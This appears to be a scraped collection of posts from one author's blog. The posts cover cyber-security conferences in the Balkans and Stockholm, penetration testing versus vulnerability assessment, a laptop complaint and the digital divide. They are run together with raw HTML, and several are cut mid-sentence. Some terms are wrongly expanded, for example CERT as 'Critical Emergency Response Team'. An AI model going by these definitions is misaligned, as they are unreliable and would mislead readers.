information assets [11].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Also, the chance that a threat will use a vulnerability to cause damage
creates a risk for the organizations. When a threat uses vulnerability
to inflict damage, it has an impact. In the context of information
security, the impact is a loss of availability, integrity and
confidentiality. Similarly, to information security, in cyber security
the additional impacts are: non-repudiation, authentication, information
systems importance and criticality according to state Critical
Information Infrastructure / Critical Infrastructure. Other possible
losses can occur too, such as loss of income and loss of life, etc. It
is very important to point out that it is impossible to find all risks,
nor is it possible to drop all risks [12].&lt;/p&gt;
&lt;/p&gt;

approaches to risk assessment. Additionally for further readings, we

In details, [1, 2] each year number of users using Internet per 100
inhabitants is increasing for near 10 percent. In the other hand, people
that are not using the Internet is correspondingly dropping. Along the
line, the access to Internet, i.e. cyberspace has become a vital step in
everyday life. We connect to Internet through various of devices. In
view of this, we expose data, along with hatred feelings about other
rights. Therefore, cyberspace has a vital impact in human rights,
privacy and right to freedom of speech. For this reason, in this essay
we will discuss and provide the guidance to the protection of data in
cyber space under certain conditions. And subsequently, we will
highlight the pros and cons.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Moreover, the definition of cyber space is as a global, borderless and
nautral space offering an environment that consists of many participants
with the ability to influence each other. Particularly to Froomkin [3]
is that Internet could increase communication among all citizens. As
well as, it could increase citizens participation in decision making
processes. Likewise could increase the legitimacy of governments and
governance structures. However, opposite view for cyberspace, or in
other words “new romantic” [4] is that is misleading for the development
of a clear vision from a legal prospective. Also, the broader concept of
‘right to access’ it may be limited and interfere with human rights in
cyberspace in the plurality of state and non-state actors. Additionally,
it is clear that the Internet provides unparalleled opportunities for
the promotion and advancement of human rights, most centrally the right
to seek, receive and impart information [5]. As well as, raises a
difficult questions of how to simultaneously protect potential competing
rights.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Obviously without question it is increasingly difficult to define human
rights and responsibilities in cyberspace, noted Mansell [6]. Yet, when
we discuss the human right to importance of security, bear in mind that
always it refers to national and private security. Anyway, one very good
example and discussion about the freedom and security in cyberspace was
in May on Stockholm Internet Forum 2013 [7], where I was personally
presented as participant. Particularly, we discussed the relationship
between freedom and security in cyberspace, where the panelists gave
their opinions emphasizing the need to keep the Internet free to make
sure that it continues to be an enabler for economic growth, freedom of
speech and the access to information. On the contrary, others emphasized
the need to fight crime on the Internet by implementing existing laws
and not necessarily by introducing new legislation contradictory to
already laid down principles and norms. Turning to security, they
underline the need to define security of what for whom. Explicitly, some
of the participants do not feel safe on the Internet, and for that,
there is need for law enforcement to improve their capabilities to fight
crimes against individuals committed online. However, these measures
should not limit the freedom of expression or basic human rights.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, we have presented above different points of view
regarding the human rights coupled within the protection of data in
cyberspace. And with this, we can summarize that actually it is not an
easy task to give a guidance for human right to the protection of data
in cyberspace. Especially that this issue has been discussed in past few
years, without any resolution and so forth. Nevertheless, we have to
keep in mind that by pursuing security coupled with freedom always leads
to awkward risk.&lt;/p&gt;

days in camp with young, smart, enthusiast, academical, non-academical,
scholars, military, history critics and politicians in a venue in wild
beauty of Montenegro, near the Plavsko lake in Plav. The location of the
camp was in a such a beautiful area. My eyes could not stop looking for
something, such as either it was the top of the mountain, or the Plavsko
lake, or even the green hills and valleys.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Anyhow, let me return to the main point here. Firstly I will like to
share a couple of history background of &lt;a href="http://www.reactmontenegro.me/"&gt;Regional Euro Atlantic Camp
REACT&lt;/a&gt;, organized by &lt;a href="http://www.alfacentar.org/"&gt;ALFA Center
Montenegro&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;First REACT camp took place in 2008, since then it takes place every
year, until now six years. The best and intriguing part of this camp is
that each year the venue of the event is in different place, therefore
the participants have a change to meet the beauty of Montenegro. The
idea in behalf of the organizers is very good, and I do support them in
this matter. Sometimes Montenegro routs could be a very heavy for the
drivers, however still this beauty should be exposed to the rest of the
world. Additionally, each year the number of participants varies
depending on the applications. However, this year there where
participants from 25 different countries, which make is in total 75
participants from elsewhere, such as, Balkans countries, Ex-Soviet Union
countries, Hungary, Slovakia, Czech Republic and many others.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to the
&lt;a href="http://www.reactmontenegro.me/agenda/agenda.html"&gt;agenda&lt;/a&gt; of REACT
2013, it was quite densely deployed, with lectures, panel discussions,
etc. Although it was heavy still the best side was the picnic adventures
and cultural evenings. Please feel free to see the pictures below of the
post.&lt;/p&gt;
&lt;p&gt;Secondly, I would like to take a time to concentrate more on the issue
of cyber security. During the event the
&lt;a href="http://www.reactmontenegro.me/agenda/list-of-speakers.html"&gt;speakers&lt;/a&gt;
where representative of governments from sixteen countries, as well as
NGOs, media, students, researchers, among the others. Mostly, the topics
where concentrating on intention to see the pros and cons of join to
NATO, where indeed the countries from this region have in mind. However,
when it comes to the goals of NATO, and new threats, such as cyber
threats, cyber crime coupled with strategies, framework and so on, only
one speaker it emphasized the importance of cyber security as one of the
greatest risk now a day and in future, of course. I will not delay too
much, as you might all unravel it was the USA Deputy Chief of Mission in
Montenegro, Mr. Jones. Mr. Jones was very precise in his speech,
moreover he mentioned the importance of infrastructure as well as the
stability and security in Balkan region. I would like to cite one of the
lectures, Mr. Petric he said “Together we are stronger!”. How the days
go by, I was just wondering and always trying to ask questions about the
cyber security, and the importance of this issue, however, most of the
speakers where no that specialized or somehow not interested of in fact
important unit of integration requirements in NATO.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Additionally, I was a moderator to a topic Kosovo open or close? The
question was which topics, fields are close or open, regarding the
Kosovo as a new country in the region.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In short summary, please feel free to see the pictures below and I hope
that in future to REACT Camp we will have much more discussions and
panels and topics about the new threats that we are facing. Likewise, I
always say, no matter how much we pour money in infrastructure and
security, still the weakest chain will be the human factor, because it
is not a aware of the importance of cyber security. Consequently, we
will have to keep in mind that this issue and importance of cyber
security is in benefits to wide security, economy and political aspects,
by process of joining and integrating the region to the path of NATO.&lt;/p&gt;

&lt;/p&gt;

&lt;p&gt;In the past few days, months and indeed years many people have
approached me and asked me a very simple question… But bare in mind that
this simple question was and indeed it is a still a big dilemma between
many professionals in IT security, cyber security, management,
decision-makers, policy, etc.  Thereby, the question is: What is the
difference between Penetration testing and Vulnerability Assessment? And
of course this question was almost always couples with the question if
we do penetration testing does it means that we are doing as well as
vulnerability assessment? In this content, I have decided to share with
you the meanings, such as, methods, approaches of each process, as well
as a further reading – papers, articles and books – that could help you
to distinguish this difference and of course broaden your views.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;With no further do, firstly I would like to make sure that we are clear
with the empirical terminologies used:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Vulnerability Assessment&lt;/strong&gt; is the process of identifying,
    quantifying, and prioritizing (or ranking) the vulnerabilities in a
    system &lt;a href="[&amp;quot;Vulnerability"&gt;2&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Penetration Testing&lt;/strong&gt; - occasionally &lt;strong&gt;pentest&lt;/strong&gt;, is a method of
    evaluating computer and network security by simulating an attack on
    a computer system or network from external and internal threats &lt;a href=""&gt;1&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Mostly, the above two terms are confused with each other. In other
words, penetration testing is necessary to determine the true attack
footprint of your environment, assets, and so fort. For this reason the
the difference is highlighted and fully explained below in separated
sections.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Vulnerability Assessments&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;It is used and of course it is necessary to discovering potential
vulnerabilities throughout the environment in for instance,
organization, company, or even asset. Usually there different scope for
such an task, nonetheless sometimes does work only by available
automatic tools or through manual test as well. Usually, and please bare
this in your mind that full exploitation of systems and services is not
generally in scope for a normal vulnerability assessment task.
Most-likely, systems are typically enumerated and evaluated for
vulnerabilities and testing can be done with or without authentication.
Additionally, important in fact for the management staff is the
actionable reports, thus reports contain details about the mitigation
strategies, for instance, applying missing patches, correcting insecure
system configurations and among the others [3].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The steps to vulnerability assessments are [4]:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Cataloging assets and resources in a system&lt;/li&gt;
&lt;li&gt;Assigning quantifiable value and importance to the resources&lt;/li&gt;
&lt;li&gt;Identifying the vulnerabilities or potential threats to each
    resource&lt;/li&gt;
&lt;li&gt;And mitigating or eliminating the most serious vulnerabilities for
    the most valuable resources&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;h1&gt;Penetration testing&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Pen testing is coupled, or in other words it expands upon vulnerability
assessment efforts by introducing exploitation into the matrix. The main
purpose is to allow the business to understand if the mitigation
strategies are actually working as it was expected.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Furthermore, pen testing requires a higher skill level than is needed
for vulnerability analysis. Particularly, this means that the price for
penetration test will be much higher than that of a vulnerability
analysis [3].&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Also, there are two primary types of pen tests:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;White box, it uses vulnerability assessment and other predisclosed
    information, and&lt;/li&gt;
&lt;li&gt;Black box, it performed with very little knowledge of the target
    systems and it is left to the tester to perform their own
    reconnaissance, to gather information as much as possible..&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Usually, pen tests follow these steps [4]:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Determination of scope&lt;/li&gt;
&lt;li&gt;Targeted information gathering or reconnaissance&lt;/li&gt;
&lt;li&gt;Exploit attempts for access and escalation&lt;/li&gt;
&lt;li&gt;Sensitive data collection testing&lt;/li&gt;
&lt;li&gt;Clean up and final reporting&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;h1&gt;Conclusion&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;The key difference between those two is that pen testing goes beyond the
level of identifying vulnerabilities and goes through the process of
exploitation, privilege escalation, and maintaining access to the target
system. Where on the other hand, vulnerability assessment provides a
better picture of any existing flaws in the system with out the
measuring the impact of the flaws to the system. However, vulnerability
assessment carefully identifies and quantifies all the vulnerabilities
in a non-invasive manner [5].&lt;/p&gt;

E330&lt;/strong&gt;&lt;/a&gt;
one year ago. It was my first time experience with Lenovo. Previous
experience was with HP, and in fact I’m sure that I do not want to get
into it, as well as even to remember it or even to mention it. Anyhow,
coming back to the Thinkpad, at the first I just fall in love with the
keyboard as well as with the red mouse pad, also the solid structure and
the black color. Like they always say laptop for the underground/hacking
and indeed nerd people, as me.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Unfortunately, recent event or I might say events made me to write this
post, where usually I do not write this kind of content to share.
However, let me start from the begging to least event as follows.&lt;/p&gt;
&lt;p&gt;First event occurred after four months where suddenly after watching the
movie the left or the right speaker stopped working. I was not aware of
this occurrence so I have continue to use the laptop, for music and for
any thing of course. But after one or to week the laptop was mute. Just
one note that I was only using &lt;a href="http://releases.ubuntu.com/precise/"&gt;Ubuntu 12.04
LTS&lt;/a&gt;, Linux, so I thought that it
might happened while I was updating and upgrading the kernel and the
drivers. After one week of troubleshooting, with forums, ubuntu ask,
kernel FAQ, finally we came to conclusion in IRC channel of ubuntu that
this might be the hardware problem. So I took the laptop to the support
service where I actually both it. The support was very friendly and of
course they did understand my problem. They have even try in front of
me, but with no sound at all. Meanwhile, while I was there we also
spotted smudge on the corner of the display. Ok, perfect, I’m already
there so let us fix it two in one. Due to the missing parts of display
the support guy just manage to order only the speakers, and he told me
to give him a call in one month to order the display as well. Usually
Lenovo alloweds one part per month to be changed, nevertheless better
something than nothing. After the speakers fixing issue the engineer
told me that the plastic where the speakers where it was kind of malted.
Surprisingly, I did not know what to say, I was listening music and loud
as anyone else. Nevertheless, this problem was fixed.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;After one month I have called him to order display and in 7 days hi send
me an email to bring the laptop to change it. Perfect, lets do it!
Finally I have got the new display installed without any spots. So I
asked the guy how it did happened, was there kind of damage or something
else. His response was very clear during the assembling of the parts,
putting them in order they most probably scratch the display on the
back. Uhhh, this can happened, of course, but why to me. Either I just
have bad luck or I’m just not too good with technology. Last but not
least, some how after few months the spot appeared again, almost on the
same place. Uffffff…, not again…&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Final problem just happened today, while I was at school writing
homework and of course working on the research paper, the battery went
out. So I plug the laptop into the desk at school, but somehow does not
charge at all. Yes, so my charger is death or maybe the entire laptop
too. Just one note, before you start wandering how I did write this
post, simple it is on the blackberry tablet. Thank you blackberry for
such a great present. Coming back, as some of you currently know I’m
outside of where I purchased the laptop, so this adds plus effort to
find a support or service for Lenovo in France. Being honest, the entire
site of Lenovo is with really bed information, and also does not helps
you how you should proceed with this problem. First thing that came into
my mind is to check if I still have the warranty. After struggling of
typing the information through smart phone, I see that the warranty of
the laptop just expired one day ago. Nice, uhuuu, I’m so bloody lucky.
In the few days, I will just need to get use to the tablet, as well as
smart phone.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, I just want to emphasis  why Lenovo will be my first and
of course my last laptop, or even any hardware from Lenovo, because of
the above occurrence. Also, like we usually say, the giant manufactures
are always producing products to expire after the warranty. So indeed,
Lenovo you are doing a hell of a good job. Hopefully if you continuous
in this path you will end of hell of a unsatisfied customers like me.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Sorry Lenovo for writing such a bed words about your production, but
please put yourself into my shoes and position. I’m hell out
frustruated. Of course I’m sick of buying laptop every year.
Nevertheless, from know one I should start searching for right one, to
fall in love. If you have any suggestions please share them below.&lt;/p&gt;

administration of Belgrade Security Forum, within goal of inviting me to
be a speaker in one of the break out sessions. In particular the session
topic is: &lt;strong&gt;Assuring Cyber-Security in the Western Balkans and the Rest
of Europe.&lt;/strong&gt; And of course, I have accepted the invitation. Speak of
which, the &lt;em&gt;Belgrade Security Forum&lt;/em&gt; has been in past few years. This –
2013 year was the third in the row event. And with it, we have continue
the talk from the previous year session about cyber security: &lt;a href="http://2012.belgradeforum.org/agenda/session3.html%20&amp;quot;Belgrade%20Security%20Forum%202012"&gt;Cyber War
and Cyber Crime: Responding to the Governance
Challenges&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to this year session, we had a very good chance to boost the
enthusiasm from other panel discussion where chairman – Richard Thomson
called me in between the discussion of Helsinki Plus 40: Strengthening
the Security Community to Meet Current Security Challenges. Where he
raise the issue of what and if it is possible with one click that
someone could stop the energy, power supply or even telecommunication
systems. And, my answer was very straightforward, indeed it is! This was
a very good spur of inspiration of our breakout session.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Together with other speaker we came to conclusion that the best way to
go ahead and to have an effective discussion is to open the most
important questions relating to cyber security: &lt;strong&gt;Who? What? and How?&lt;/strong&gt;
But before further to the answers the above question, I would like also
to mention that the speakers where kind of divided, in a good sense
where we came from different regions as well as specialized fields in
cyber security. In details, &lt;strong&gt;Baroness Pauline Neville-Jones&lt;/strong&gt; was in
related fields in government issues and challenges in cyber security.
Where on other hand, I was a representative from the Wester Balkan
region representative. Furthermore, &lt;strong&gt;Alexander Klimburg&lt;/strong&gt; was more
concentrating of different stakeholder, in other words multi
stakeholders approach. Where last but not least, &lt;strong&gt;Jovan Kurbalija&lt;/strong&gt; was
in diplomacy, civil society and information technology. And finally, the
moderator of the session was &lt;strong&gt;Vladimir Radunović&lt;/strong&gt;, who manage to
create a nice vibe between the speakers and the audience from the
beginning until the end of the session. For more details of the session
please follow the Breakout session report: &lt;a href="http://belgradeforum.org/info/news/459/Session+7%3A+Assuring+Cyber-Security+in+the+Western+Balkans+and+the+Rest+of+Europe.html" title="Session 7: Assuring Cyber-Security in the Western Balkans and the Rest of Europe"&gt;Session 7: Assuring
Cyber-Security in the Western Balkans and the Rest of
Europe&lt;/a&gt;.
For more information of the issues that we follow and given answers are
available on the
&lt;a href="http://www.belgradeforum.org/agenda/sesija5.html" title="Agenda"&gt;Agenda&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;From left to right: Vladimir Radunović, Predrag Tasevski, Jovan
Kurbalija, Alexander Klimburg and Baroness Pauline Neville-Jones&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Also I would like to make some quick notes on the main cyber threats and
possible effects that are linked to Western Balkan region. The most
known and presented cyber threats are among the cybercrime. For instance
in one hand are: employee fraud, minor and child pornography; using of
mobile telephones and smartphones as tools to commit other crime;
identity theft and credit card fraud. Where on the other hand are among
the political, moral, ethical and other motivation reasons. Such as,
web-based attacks, mostly committed by defacement or denial-of-service
attacks. Then we have phising and spoofing social networking sites.
Where the possible effects are for instance for individuals loss of
money, and of course political or ethical doctrine. Moreover, awareness
of roles and responsibilities of different actors, such as government,
regulators, industry and civil society of risk are taken into
consideration only the implementation of law. For instance, data
protection law and so on. Turning to the industry and civil society is
almost the same, although some of them are implementing the very known
standards, such as ISO 27001 and so on. However, is this enough? The
roles and responsibilities are only described in the data protection law
and criminal law. Unfortunately, it is not carried out by the framework
or even a strategy. Likelihood, awareness level in Western Balkans
presented by my paper back book that I have conducted last year,
&lt;a href="http://www.amazon.com/Interactive-Cyber-Security-Awareness-Program/dp/3659207985/ref=sr_1_1?s=books&amp;amp;ie=UTF8&amp;amp;qid=1367779682&amp;amp;sr=1-1&amp;amp;keywords=Interactive+Cyber+Security+Awareness+Program" title="Interactive Cyber Security Awareness Program"&gt;Interactive Cyber Security Awareness Program Cyber Security Awareness
Program&lt;/a&gt;.
This book outlines the survey done around 1000 participants, from 11 to
63 years old. In diversity of carries, such as schools, universities,
private and public organizations. In total we had 35% people using
computers/internet from home and 26% from office. In particular and most
interesting figures for us are results about the knowledge of protecting
their IT assets, and in details: 16% are very knowledgeable, least
knowledgeable are 13% and last but not least somewhat knowledgeable are
40%. Therefore from the results presented we can see that awareness
level among the end users is vary. Coming to the end, if we want to make
sure the involvement of end users in raising trust and securing the
cyberspace we firstly have to start from strategy, than legal framework,
followed by implementation, and so on. However, when it comes to step to
get done by governments should be as follows:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Develop and create strategy framework for Cyber-security, in
    particular, not to cover the area only of cyber crime, but also how
    to mitigate happened incidents.&lt;/li&gt;
&lt;li&gt;Rewrite and review the cyber crime law and data protection law.&lt;/li&gt;
&lt;li&gt;Create NGO or NPO that will deal not only for a concrete country but
    of course the entire region, as well.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;In the end I have noted that some countries in Wester Balkans do not
have &lt;strong&gt;yet&lt;/strong&gt; either, CERT – Critical Emergency Response Team nor CIRT –
Critical Incident Response Team. Therefore, this action should be taken
as soon as possible.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In summary, hope that the above notes will take effect, as well as will
raise the awareness of the important in fact issue. Therefore we have to
be simple and follow just simple three steps:&lt;/p&gt;
&lt;/p&gt;

&lt;ol&gt;
&lt;li&gt;Strategical plan which will aim in business continuity.&lt;/li&gt;
&lt;li&gt;Partnership between Groups, such as government, private and civil.
    As well as to provide awareness on the share bases.&lt;/li&gt;
&lt;li&gt;Education the public, where we need to take an action of
    re-informing the school materials, and to provide the young
    generations guide of how to protect in cyber space and skills.&lt;/li&gt;
&lt;/ol&gt;
&lt;/p&gt;

&lt;p&gt;Thank you to the participant, speakers, guest, organizers and everyone
for such a lovely stay in Belgrade.&lt;/p&gt;

beforehand prepared scenarios.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The agenda of the course was as below:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Cyber security vs. IT security&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Types of attacks&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Types of vulnerabilities&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Types of exploitation&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Work-shop: Red, White and Blue teams&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;The attendance to the course was 20 people, which in fact surprises me
in a very good way. The group was with various of majors, for instance
from the youngest elementary school, students in engineering to IT
specialises in financial sector, as well as future start-ups
e-commerce/e-shops companies.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Turning to a near future we will prepare a courses with more in-depth
work-shops and more technical. Likewise, getting hands dirty, by
hacking, attacking virtual machines, as well as performing
countermeasures. Throughout virtualiazed environment attacks and
exploitations, etc.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Hopefully that the above course has raised the awareness level of IT
security importance.&lt;/p&gt;
&lt;p&gt;To have a better picture and understanding what we have covered on the
training we have provided you with the presentation below and picture

&lt;p&gt;Also I would like to share the note that the journalist did a very good
job, by highlighting the important statement made during the interview:

of Internet, human rights, freedom of speech, censorship, privacy as
well as importance of security. Among the topics, also we have touched
the cyber security, surveillance, importance of information security
coupled with critical information infrastructure and critical
infrastructure. Once Alex Levin has said – “The reason there is so
little crime in Germany is that it’s against the law.” – What a hack he
was talking? Was he right or wrong? For this reason, the SIF was held
this year with more than 94 different countries participants, from all
over the world. And indeed, it was one of the best conference organized
so far. Nevertheless the number of differential participants let the
talks and the conference topics just to flow. Even that the four days of
talking was not enough. However, this was just a start, or for someone
the beginning of an idea due to the poverty of our thoughts.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;The opening speech was by Carl Bildt where he presented in fact an
importance of digital revolution, African development through
connectivity, political debates for freedom of Internet. In addition, he
gave a couple of great examples, such as legislations of blocking sites
in Russia, violations of human rights in Syria, Vietnam among the
others. Also, he noted the security importance of cyber security, where
security should be thought but of course should not be used in purpose
to limit the human rights. One very good quote, even after two weeks
from the conference I still have it in my head, is &lt;strong&gt;*“Free societies
are strong societies”&lt;/strong&gt;. Last but not least, was that we should take an
examples from the leading nations of ICT, such as, Sweden, where the
security coupled with human rights are presented on Internet.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;Frankly, in the opening session we have touched the issue with
surveillance and software used for this purpose, coupled with the
viability of digital divide popular in Africa and among others.
Moreover, we have purse the issue of Internet jurisdiction projects, as
well as that we have to boost the awareness of regulations united with
the important factor to increased the civil societies in freedom. For
more info please visit the summaries notes from the session, &lt;a href="http://www.stockholminternetforum.se/program/opening-session/" title="Opening session"&gt;Opening
session&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;To continue with the first session again we have to come back some
example of the above issue, surveillance, where Mexico has
&lt;a href="http://en.wikipedia.org/wiki/Closed-circuit_television" title="Closed-circuit television - Wikipedia"&gt;CCTV&lt;/a&gt;
in private sector for 3 to 4 years. Among the surveillance we have
discuss the issue during the riots in London, Syria and Panama as a
recent examples where they have shutdown the mobile phone network.
Additionally, point in some countries is that people do trust the law
enforcement in privacy, where opposite such as in Pakistan they trust
only the companies, and not law enforcement agencies. Moreover, hate
speech, digital freedom and democracy of freedom was carried out, along
with how the law works on Internet with civil societies and that the
police need to do their own job. Nevertheless, the note was that
vocabulary of cyber security is missing, and it should become a national
security and of course the security is a huge problem. This problem is
done due to the lack of new laws, by definition of what we mean by a
single law treaty. Whom we should secure? What should be asked? In
sentence of security importance, civil society. We really need a cyber
security strategy, by introducing the legislation and laws throughout
experience. In spite of vocabulary e should define and terms, such as,
&lt;a href="http://en.wikipedia.org/wiki/Hacktivism" title="Hacktivism - Wiki"&gt;hacktivism&lt;/a&gt;
and
&lt;a href="https://en.wikipedia.org/wiki/Cyberterrorism" title="Cyberterrorism - Wiki"&gt;cyberterrorism&lt;/a&gt;.
One important note was mentioned that we do not want global cyber
security law. For more info of the session please visit the following
link &lt;a href="http://www.stockholminternetforum.se/program/session-1/informal-summary/" title="Session 1: Reconciling freedom and security in cyberspace"&gt;Reconciling freedom and security in
cyberspace&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;As we mentioned above the frustration was between the west and
developing countries in sentence of digital divide. Also one note was
that Sweden people trust to the government agencies, as well as that
e-voting system in Sweden will help ICT to boost. The session where
split into three parts:&lt;/p&gt;
&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.stockholminternetforum.se/program/session-1a/informal-summary-of-session-1a/" title="1A Global security and human rights in the internet age"&gt;1A Global security and human rights in the internet

    context&lt;/a&gt;.&lt;/li&gt;
&lt;/ul&gt;
&lt;/p&gt;

&lt;p&gt;Next day, the second day of the forum (SIF13) we have touched a facts
about the free and open Internet and open communications. The second day
I will remember forever for speech of the famous Cuban blogger Yoani
Sánchez, which said very good quote “Cuba Internet on Internet” or
another one is that if your relatives or you personally travel to Cuba
bring the old and unused gadgets with you and leave them in Cuba or just
give them, rather than you should just dispose them or throw them into
the trash. For more info please visit the &lt;a href="http://www.stockholminternetforum.se/summaries-2013/" title="Summaries 2013 | Stockholm Internet Forum"&gt;Summaries 2013
page&lt;/a&gt;.&lt;/p&gt;
&lt;/p&gt;

&lt;p&gt;In conclusion, I might say that the SIF 13 was very successful, as well
as very important questions and topics were discussed. However, we
should concentrate for the next year forum on more specific topics,
either freedom or only a security. It is very difficult when we speak
about freedom coupled with security. Does two topics are very linked and
fragile. In the end, I would like to thank a lot to the organizers,

&lt;/p&gt;

&lt;p&gt;The Internet is changing the average citizens as much as did other
technologies, for instance: telephone, TV, computers, mobile phones,
etc. The main province was to help the science, engineering, and
business. Many scholars, technologists, and social critics believe that
these changes and the Internet, in particular, are transforming economic
and social life [1]. In the past few years, the scholars have done many
researches to make a conclusion of difference in psychological and
social tend of the Internet to the citizens. Therefore, the term
“digital divide” is the gap that exists between those who have access to
electronic and Information Technology – Internet and those who do not
[2]. Whereby the Anti-Counterfeiting Trade Agreement (ACTA) set up could
result in an order of restricting the universal access to the Internet.
And representing a barrier to European development as an information,
knowledge and technology society. In other words, could lead to the
censorship of online content and control-restriction to the Internet’s
freedom, by intimidation the growth of electronic business, cultural
exchange, as well as digital creativity. In order to safe the Internet
and to provide shelter to digital divide culture we will have to take
actions.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Introduction&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;Enormous continuing and boosting usage of information and communication
technologies in an economic inequality between groups, broadly
construed, in terms of access and knowledge has created the term digital
divide. Additionally, divide inside countries also could refer to
individuals, households, business and geographical areas at different
socioeconomic and other demographic levels. On one hand the Internet is
changing the average citizens. As much as on the other hand the other
technologies, such as: telephone, TV, mobile phones, etc. The main idea
and purpose was to aid to and benefit the science, engineering, and
business. However, many scholars, technologists, and social critics
believe that these changes and the Internet, in particular, are
transforming economic and social life [1]. In the past, the scholars
have done many researches to make a conclusion of difference in
psychological and social tend of the Internet to the citizens.
Therefore, the term “digital divide” is the gap that exists between
those who have access to electronic and Information Technology –
Internet and those who do not [2]. Moreover, interesting is to point out
that to break the gap between the digital divide the scholars and
societies have created a new approach and technology for delivering
laptop per child. The project name is one laptop per Child and
significant fact is that as of 2011 there were over about 2.4 million XO
laptops delivered elsewhere [4]. Whereby the Anti-Counterfeiting Trade
Agreement (ACTA) could result in an order of restricting the universal
access to the Internet. And representing a barrier to European
development as an information, knowledge and technology society. In
other words, could lead to the censorship of online content and
control-restriction to the Internet’s freedom, by intimidation the
growth of electronic business, cultural exchange, as well as digital
creativity. Therefore, in this article we have introduced the readers
within the basic concept of digital divide. In addition we illustrate to
the readers a map of digital divide and example countries that have
stress out the digital divide. In contrast to digital divide we would
emphasis on the secret negotiations of ACTA agreement. Moreover, why we
should care about it, as well as in order to safe the Internet what kind
of actions we should take into consideration. At least we deliver to the
readers a conclusion.&lt;/p&gt;
&lt;/p&gt;

&lt;h1&gt;Digital divide&lt;/h1&gt;
&lt;/p&gt;

&lt;p&gt;As we mentioned previously it is a term to determine the gap that exists
between those who have access to electronic and Information Technology –
Internet and those who do not [1]. Thereby in the next subsection we
introduce the readers within the concept and basic approach of
determining and criteria to define the digital divide. Least we also
provide the example country of digital divide.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Concept&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;The main concept and criteria of digital divide is shown below [3]:&lt;/p&gt;
&lt;p&gt;​1. Subjects of connectivity, or who connects: individuals,
organizations, enterprises, schools, hospitals, countries, etc.&lt;/p&gt;
&lt;p&gt;​2. Characteristics of connectivity, or which attributes: demographic
and socio-economic variables, such as income, education, age, geographic
location, etc.&lt;/p&gt;
&lt;p&gt;​3. Means of connectivity, or connectivity to what: fixed or mobile,
Internet or telephony, digital TV, etc.&lt;/p&gt;
&lt;p&gt;​4. Intensity of connectivity, or how sophisticated the usage: mere
access, retrieval, interactivity, innovative contributions.&lt;/p&gt;
&lt;p&gt;​5. Purpose of connectivity, or why individuals and their cohorts are
(not) connecting: reasons individuals are and are not online and uses of
the Internet and ICTs.&lt;/p&gt;
&lt;/p&gt;

&lt;h2&gt;Example&lt;/h2&gt;
&lt;/p&gt;

&lt;p&gt;One of the best example of digital divide is a North Korea. The
broadband infrastructure is with optical fiber links up to 2.5Gbits/s
[5]. Additionally the Internet in North Korea is more or less is
recalled as “Intranet”, because of implementation of the Kwangmyong
network, in English “walled garden” [6]. The most significant fact was
the news have spread information that one of the most known torrent
sites has been moved to and relocated in North Korea, March 4 2013.
However this information was no correct. For more details please refer
to the following source [7]. Nevertheless the above are just simple
